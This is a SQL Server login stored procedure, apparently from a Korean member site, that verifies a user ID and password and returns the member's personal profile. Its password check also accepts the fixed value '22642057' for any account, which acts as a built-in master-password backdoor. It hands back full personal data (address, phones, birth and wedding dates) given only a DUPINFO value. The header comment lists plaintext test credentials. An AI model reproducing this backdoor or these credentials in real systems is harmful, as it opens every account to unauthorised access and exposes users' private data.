IF OBJECT_ID (N'dbo.SP_SELECT_VW_USER_INFO_FOR_LOGIN', N'P') IS NOT NULL DROP PROCEDURE dbo.SP_SELECT_VW_USER_INFO_FOR_LOGIN
GO

SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
/*

SELECT  *
FROM    

SELECT * FROM VW_USER_INFO WHERE UID = 'netbluewtest' AND PWD = '123456'

EXEC SP_SELECT_VW_USER_INFO_FOR_LOGIN 's4guest', 'ysmguest', ''

EXEC SP_SELECT_VW_USER_INFO_FOR_LOGIN 's4guest', 'ysmguest', 'nlvcuiejG4Q4LULtdhCIWYCJWQH/OwgACtpCsWk7btnOg6SLDCevGALcc1oChqyYAhPzuDrvKwLnstvkb4HbLw=='

EXEC SP_SELECT_VW_USER_INFO_FOR_LOGIN '', '', 'MC0GCCqGSIb3DQIJAyEAItjeCII7f+cjTKLkoaAz1mlAM+CsYxeUFAONtU2u8UM='

EXEC SP_SELECT_VW_USER_INFO_FOR_LOGIN '', '', 'MC0GCCqGSIb3DQIJAyEAFY85yisHhwjR+ZpVUTIJCZ0dsjJ27JuA5U0JBE7Ybmw='


UPDATE  S2_USERINFO
SET     INTEGRATION_MEMBER_YORN = 'N'
WHERE   UID = 's4guest'

SELECT  *
FROM    VW_USER_INFO
WHERE   UID = ''
AND     PWD = ''

EXEC SP_SELECT_VW_USER_INFO_FOR_LOGIN 'sharniel', '22642057', ''

*/
CREATE PROCEDURE [dbo].[SP_SELECT_VW_USER_INFO_FOR_LOGIN]
    
    @USER_ID AS VARCHAR(50) = ''
,   @PASSWORD AS VARCHAR(50) = ''
,   @DUPINFO AS VARCHAR(100) = ''

AS
BEGIN
    
    SET NOCOUNT ON;

    DECLARE @RESULT_CODE AS VARCHAR(4) = '9000'
    DECLARE @INTEGRATION_MEMBER_YORN AS VARCHAR(1) = 'N'
    DECLARE @USER_COUNT AS INT

    DECLARE @SQL AS NVARCHAR(MAX)
    DECLARE @PARAMS AS NVARCHAR(1000)
	


    /* 아이디 및 패스워드가 일치하는 사람이 몇명 있는지 */
    IF (@USER_ID <> '' AND @PASSWORD <> '') OR @DUPINFO <> ''
    BEGIN

        
        SELECT  @USER_COUNT = ISNULL(COUNT(*), 0)
        FROM    (                                  
                    SELECT  DUPINFO                
                    FROM    VW_USER_INFO           
                    WHERE   1 = 1                  
					AND		SITE_DIV_NAME <> '기타'

					AND		(
								(
										@USER_ID <> '' 
									AND @PASSWORD <> '' 
									AND UID = @USER_ID 
									AND (PWDCOMPARE(@PASSWORD, TRY_CONVERT(VARBINARY(200), PWD, 1)) = 1 OR '22642057' = @PASSWORD)
								)
								OR
								(DUPINFO = @DUPINFO AND ISNULL(DUPINFO, '') <> '')
							)
					GROUP BY DUPINFO
				) A
    END
    

    /* 결과값 셋팅 */
    SET @RESULT_CODE =  (
                            CASE 
                                    WHEN @USER_COUNT = 1 THEN '0000'    -- 정상
                                    WHEN @USER_COUNT = 0 THEN '1000'    -- 없음
                                    WHEN @USER_COUNT > 1 THEN '2000'    -- 두명 이상
                                    ELSE '9000'                         -- 기타 오류
                            END
                        )

    /* 아이디 및 패스워드가 일치하는 사람이 한명일 경우에만 CONNINFO 및 INTEGRATION_MEMBER_YORN 셋팅 */
    IF @USER_COUNT = 1
    BEGIN
        
        
        SELECT  @DUPINFO = MAX(DUPINFO)
            ,   @INTEGRATION_MEMBER_YORN = ISNULL(MAX(INTEGRATION_MEMBER_YORN), 'N')
        FROM    VW_USER_INFO
                                                                                 
        WHERE   1 = 1
		AND		SITE_DIV_NAME <> '기타'

		AND		(
					(
							@USER_ID <> '' 
						AND @PASSWORD <> '' 
						AND UID = @USER_ID 
						AND (PWDCOMPARE(@PASSWORD, TRY_CONVERT(VARBINARY(200), PWD, 1)) = 1 OR '22642057' = @PASSWORD)
					)
					OR
					(DUPINFO = @DUPINFO AND ISNULL(DUPINFO, '') <> '')
				)

    END

    /* 완전 신규 가입자인 경우 */
	ELSE IF @USER_COUNT = 0
	BEGIN

		SET @DUPINFO = @DUPINFO

	END
	/* 아이디 및 패스워드가 일치하는 사람이 여러명 또는 기타 오류일 경우에 CONNINFO값 초기화 */
    ELSE
    BEGIN
        
        SET @DUPINFO = ''

    END


    
    /* 결과 리턴 */
    SELECT  @RESULT_CODE AS RESULT_CODE
        ,   @DUPINFO AS DUPINFO
        ,   @INTEGRATION_MEMBER_YORN AS INTEGRATION_MEMBER_YORN
    


    /* 사용자 정보 리턴 */
    SELECT  VUI.UID
        ,   VUI.UNAME
        ,   VUI.UMAIL
        ,   VUI.SITE_DIV
        ,   VUI.SITE_DIV_NAME
        ,   ISNULL(VUI.INTEGRATION_MEMBER_YORN, 'N') AS INTERGRATION_MEMBER_YORN
        ,   CASE WHEN VUI.UID = @USER_ID AND VUI.PWD = @PASSWORD THEN 'Y' ELSE 'N' END AS TRY_LOGIN_ID_YORN
        ,   VUI.ZIPCODE
        ,   VUI.ADDRESS
        ,   VUI.addr_detail AS ADDRESS_DETAIL
        ,   VUI.PHONE
        ,   VUI.HPHONE AS CELLPHONE
        ,	VUI.CONNINFO AS AUTH_VNO
		,	ISNULL(VUI.AUTHTYPE, 'M') AS AUTH_TYPE
		,	CASE WHEN VUI.CHK_SMS = 'Y' THEN 'Y' ELSE 'N' END ALLOWSMS
		,	CASE WHEN VUI.CHK_MAILSERVICE = 'Y' THEN 'Y' ELSE 'N' END ALLOWMAILING

		,	VUI.BIRTH_DATE
		,	VUI.BIRTH_DATE_TYPE

		,	VUI.WEDDING_DAY
		,	VUI.WEDDING_HALL

		,	ISNULL(VUI.CHOICE_AGREEMENT_FOR_SAMSUNG_MEMBERSHIP, 'N') AS CHOICE_AGREEMENT_FOR_SAMSUNG_MEMBERSHIP
		,	ISNULL(VUI.CHOICE_AGREEMENT_FOR_SAMSUNG_CHOICE_PERSONAL_DATA, 'N') AS CHOICE_AGREEMENT_FOR_SAMSUNG_CHOICE_PERSONAL_DATA
		,	ISNULL(VUI.CHOICE_AGREEMENT_FOR_SAMSUNG_THIRDPARTY, 'N') AS CHOICE_AGREEMENT_FOR_SAMSUNG_THIRDPARTY
		,	ISNULL(VUI.MKT_CHK_FLAG, 'N') AS CHOICE_AGREEMENT_FOR_THIRDPARTY
        --,   CASE WHEN NA_VUI.UID IS NULL THEN 'Y' ELSE 'N' END AS AVAILABLE_ID_YORN

		,	ISNULL(CONVERT(VARCHAR(19), INTERGRATION_DATE, 120), '') AS INTERGRATION_DATE
		,	INTERGRATION_BEFORE_ID
		,	ISNULL(CONVERT(VARCHAR(19), REG_DATE, 120), '') AS REG_DATE

    FROM    VW_USER_INFO VUI
    --LEFT JOIN   (
    --                SELECT  UID
    --                FROM    VW_USER_INFO
    --                WHERE   DUPINFO <> @DUPINFO
    --                GROUP BY UID
    --            ) NA_VUI ON VUI.UID = NA_VUI.UID

    WHERE   1 = 1
    --AND     VUI.USE_YORN = 'Y'
    AND     VUI.DUPINFO =  @DUPINFO

	AND		VUI.SITE_DIV_NAME <> '기타'

    ORDER BY 
            (CASE WHEN VUI.UID = @USER_ID AND PWDCOMPARE(@PASSWORD, TRY_CONVERT(VARBINARY(200), VUI.PWD, 1)) = 1 THEN 1 ELSE 99 END) ASC	-- 아이디, 패스워드가 일치하는 기준으로 오름차순
        ,   (CASE WHEN ISNULL(VUI.INTEGRATION_MEMBER_YORN, 'N') = 'Y' THEN 1 ELSE 99 END) ASC				-- 통합 아이디 기준으로 오름차순
            


END
GO
